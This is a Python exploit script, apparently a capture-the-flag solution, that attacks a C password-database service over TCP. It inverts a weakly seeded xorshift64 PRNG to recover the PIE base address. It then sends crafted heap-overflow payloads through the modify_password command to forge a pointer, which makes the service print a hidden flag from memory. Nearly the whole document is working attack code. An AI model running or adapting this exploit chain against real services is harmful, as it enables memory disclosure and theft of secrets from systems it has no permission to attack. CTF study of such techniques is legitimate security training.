#!/usr/bin/env python3
"""
vaultlock flag3 exploit -- pure network exploitation of dist/db/db.c
======================================================================

Bug chain (Mr. X's "backdoor"):

1. Weak PRNG seeding leaks the PIE base.
   gen_uuid() seeds a xorshift64 PRNG with:
       xorshift_state = time(NULL) ^ (uintptr_t)&xorshift_state
   i.e. the seed is mixed with the *address of a global variable in the
   binary itself*. xorshift64 is a linear, invertible transform, so from
   the very first UUID the server ever returns we can invert it to recover
   the exact seed, and by brute-forcing the (tiny, few-minutes-wide) range
   of plausible time(NULL) values we recover &xorshift_state exactly --
   which gives us the PIE load base (checked against the fixed offset of
   the `xorshift_state` and `flag` symbols in the binary).

2. modify_password() heap overflow gives an arbitrary-address read.
   save_password() sets Password.password_size = strlen(password).
   modify_password() does:
       snprintf(slot->password, slot->password_size - 1, "%s", new_password)
   If password_size is inflated (via a no-op call where size param
   underflows/miscomputes) beyond the *actual* malloc'd buffer size, the
   next call overflows straight into the next sequentially-allocated
   Password struct on the heap, letting us overwrite its `password`
   pointer field with an address of our choosing. get_passwords() then
   printf("%s", ...)'s that pointer, giving us a read-what-where primitive.

Combining the two: leak PIE base -> compute &flag (a global buffer the
binary reads /flag.txt into at startup, but never exposes through any
menu command) -> forge a Password.password pointer at &flag -> get_passwords
dereferences it and prints the flag back to us.

No local/filesystem access to the target is used anywhere below --
everything goes over the TCP socket to the `db` service (port 8080).
"""
import sys
import time
import struct
import socket
import argparse

MASK = (1 << 64) - 1

# ---- link-time constants, read from `nm`/`readelf -s` on dist/db/build/db ----
XORSHIFT_STATE_OFF = 0x5288   # &xorshift_state - PIE base
FLAG_OFF = 0x5160             # &flag           - PIE base
# byte offset from the overflow source buffer (an empty/1-byte password) to
# the `password` pointer field of the *next* sequentially-allocated
# Password struct on the heap. Derived from struct layout:
#   id[37] + user_id[37] + name[0x120] -> padded to 8 -> password ptr
# plus the malloc chunk header (16B) of that next chunk.
OVERFLOW_TO_PW_PTR = 0x190


# ---------------------------------------------------------------- xorshift64
def xorshift64(x):
    x ^= (x << 13) & MASK
    x ^= (x >> 7)
    x ^= (x << 17) & MASK
    return x & MASK


def _undo_shl_xor(y, k):
    x = y
    for _ in range(70 // k + 2):
        x = (y ^ ((x << k) & MASK)) & MASK
    return x


def _undo_shr_xor(y, k):
    x = y
    for _ in range(70 // k + 2):
        x = (y ^ (x >> k)) & MASK
    return x


def inv_xorshift64(y):
    x2 = _undo_shl_xor(y, 17)
    x1 = _undo_shr_xor(x2, 7)
    x0 = _undo_shl_xor(x1, 13)
    return x0


# ------------------------------------------------------------- protocol I/O
class DB:
    """Each TCP connection to db.c serves exactly one menu command."""

    def __init__(self, host, port, timeout=8):
        self.host = host
        self.port = port
        self.timeout = timeout

    def _new_conn(self):
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        self._recv_until(s, b'choice > ')
        return s

    def _recv_until(self, s, marker, maxlen=1 << 20):
        buf = b''
        s.settimeout(self.timeout)
        while marker not in buf:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
            if len(buf) > maxlen:
                break
        return buf

    def _sendline(self, s, data):
        if isinstance(data, str):
            data = data.encode()
        s.sendall(data + b'\n')

    def _cmd(self, choice, prompts_and_values):
        s = self._new_conn()
        self._sendline(s, str(choice))
        for prompt, value in prompts_and_values:
            self._recv_until(s, prompt)
            self._sendline(s, value)
        out = self._recv_until(s, b'choice > ')
        s.close()
        return out

    def insert_user(self, username, pubkey):
        return self._cmd(1, [(b'username   : ', username), (b'public_key : ', pubkey)])

    def get_user(self, username):
        return self._cmd(2, [(b'username : ', username)])

    def save_password(self, username, name, password):
        return self._cmd(3, [(b'username  : ', username), (b'name     : ', name), (b'password : ', password)])

    def get_passwords(self, username):
        return self._cmd(4, [(b'username : ', username)])

    def modify_password(self, username, name, password):
        return self._cmd(7, [(b'username  : ', username), (b'name     : ', name), (b'password : ', password)])


# --------------------------------------------------------- PIE base recovery
def uuid_to_ab(uuid_text):
    b = bytes.fromhex(uuid_text.replace('-', ''))
    a = int.from_bytes(b[0:8], 'little')
    bb = int.from_bytes(b[8:16], 'little')
    return a, bb


def recover_a_candidates(uuid_text):
    """gen_uuid() forces 6 bits (UUID version/variant), so `a` (bytes 0-7)
    and `b` (bytes 8-15) aren't fully recoverable verbatim; brute the 16
    possibilities for the lost nibble and cross-check against `b`."""
    a_obs, b_obs = uuid_to_ab(uuid_text)
    a_mask = ~(0xF << 52) & MASK          # byte6 top nibble forced to 0x4
    b_mask = ~(0b11 << 6) & MASK          # byte8 top 2 bits forced to 0b10
    a_known = a_obs & a_mask
    b_known = b_obs & b_mask
    cands = []
    for nib in range(16):
        a_cand = a_known | (nib << 52)
        if (xorshift64(a_cand) & b_mask) == b_known:
            cands.append(a_cand)
    return cands


def find_pie_bases(uuid_text, t_low, t_high):
    bases = set()
    for a_cand in recover_a_candidates(uuid_text):
        seed = inv_xorshift64(a_cand)  # seed = time(NULL) ^ &xorshift_state
        for t in range(t_low, t_high + 1):
            addr_of_state = seed ^ t
            base = (addr_of_state - XORSHIFT_STATE_OFF) & MASK
            if base & 0xFFF:                       # PIE base is page-aligned
                continue
            if not (0x555555554000 - 0x200000000000 <= base <= 0x7f0000000000):
                continue
            bases.add(base)
    return sorted(bases)


# --------------------------------------------------------------------- main
def exploit(host, port, window=180, verbose=False):
    db = DB(host, port)
    username = 'x' + str(int(time.time()))[-6:]

    t_before = int(time.time())
    r = db.insert_user(username, 'pk')
    if b'OK' not in r:
        raise RuntimeError(f'insert_user failed: {r!r}')
    r = db.get_user(username)
    t_after = int(time.time())
    if b'ID=' not in r:
        raise RuntimeError(f'get_user failed: {r!r}')
    uuid_text = r.decode().split('ID=')[1].split(' ')[0]

    bases = find_pie_bases(uuid_text, t_before - window, t_after + window)
    if not bases:
        raise RuntimeError(
            'no PIE base candidate recovered -- this only works against the '
            'FIRST connection to a freshly (re)started db process (the RNG '
            'is seeded once, lazily, on first use). Reconnect to a fresh '
            'instance and try again, or widen --window.'
        )
    if verbose:
        print(f'[*] recovered {len(bases)} PIE base candidate(s)', file=sys.stderr)

    for base in bases:
        flag_addr = base + FLAG_OFF
        addr_bytes = struct.pack('<Q', flag_addr)
        # top 2 bytes of any canonical address are always 0, and so are the
        # pre-existing high bytes of the pointer we're overwriting -- only
        # the low 6 bytes need to be written explicitly.
        if addr_bytes[6] or addr_bytes[7]:
            continue
        sig_bytes = addr_bytes[:6]
        if b'\x00' in sig_bytes:
            if verbose:
                print('[!] address has an embedded NUL byte, skipping candidate', file=sys.stderr)
            continue

        if verbose:
            print(f'[*] PIE base = {hex(base)}  flag @ {hex(flag_addr)}', file=sys.stderr)

        assert b'OK' in db.save_password(username, 'A', 'X')            # password_size = 1
        assert b'OK' in db.save_password(username, 'B', 'placeholder')  # next struct on heap

        # step 1: inflate A's recorded password_size without touching memory
        assert b'OK' in db.modify_password(username, 'A', 'A' * 4000)

        # step 2: real overflow -- forge B.password to point at &flag
        long_payload = b'A' * OVERFLOW_TO_PW_PTR + sig_bytes
        assert b'OK' in db.modify_password(username, 'A', long_payload)

        # step 3: short write repairs B.user_id (needed so get_passwords's
        # ownership check still matches) without touching the forged pointer
        short_payload = b'A' * 32 + b'A' * 37 + uuid_text.encode()
        assert len(short_payload) == 105
        assert b'OK' in db.modify_password(username, 'A', short_payload)

        out = db.get_passwords(username)
        if verbose:
            print(out.decode(errors='replace'), file=sys.stderr)

        for line in out.split(b'\n'):
            if line.startswith(b'[1]') and b'password=' in line:
                pw = line.split(b'password=', 1)[1].rsplit(b' size=', 1)[0]
                if pw:
                    return pw.decode(errors='replace')

    raise RuntimeError('exploit did not yield a flag for any base candidate')


if __name__ == '__main__':
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument('host')
    ap.add_argument('port', type=int)
    ap.add_argument('--window', type=int, default=180,
                     help='seconds of clock-skew tolerance to brute-force around time(NULL) (default 180)')
    ap.add_argument('-v', '--verbose', action='store_true')
    args = ap.parse_args()

    flag = exploit(args.host, args.port, args.window, args.verbose)
    print(flag)
